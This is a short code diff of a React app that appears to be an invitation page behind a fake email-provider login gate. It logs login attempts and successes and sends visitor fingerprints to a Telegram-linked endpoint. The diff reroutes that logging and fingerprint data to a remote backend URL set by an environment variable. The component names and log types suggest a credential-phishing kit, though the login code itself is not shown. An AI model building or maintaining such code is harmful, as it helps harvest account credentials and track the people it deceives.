@@ -6,18 +6,22 @@ import ProviderSelection from "./components/ProviderSelection";
 import ProviderLogin from "./components/ProviderLogin";
 import GuestDashboard from "./components/GuestDashboard";
 
+// 💡 Capture Render's backend production URL environment string, fallback to empty string for local setups
+const API_BASE_URL = import.meta.env.VITE_API_URL || "";
+
 export default function App() {
   const [currentScreen, setCurrentScreen] = useState<"main" | "provider_select" | "login" | "dashboard">("main");
   const [selectedProvider, setSelectedProvider] = useState<GatewayProvider>("gmail");
   const [loggedEmail, setLoggedEmail] = useState("");
 
-  // Server logging function to bridge client steps to Express logs dashboard
+  // Server logging function to bridge client steps to Flask backend logs
   const logAction = async (
     type: "PAGE_VIEW" | "PROVIDER_SELECT" | "GATEWAY_LOGIN_ATTEMPT" | "LOGIN_SUCCESS" | "RSVP_SUBMITTED",
     details: string
   ) => {
     try {
-      await fetch("/api/logs", {
+      // 💡 Appended ${API_BASE_URL} to pipeline telemetry out cleanly
+      await fetch(`${API_BASE_URL}/api/logs`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type, details })
@@ -60,7 +64,8 @@ export default function App() {
     };
 
     try {
-      await fetch("/api/telegram/visitor_entry", {
+      // 💡 Appended ${API_BASE_URL} to register entry fingerprints on Render
+      await fetch(`${API_BASE_URL}/api/telegram/visitor_entry`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(fingerprint)
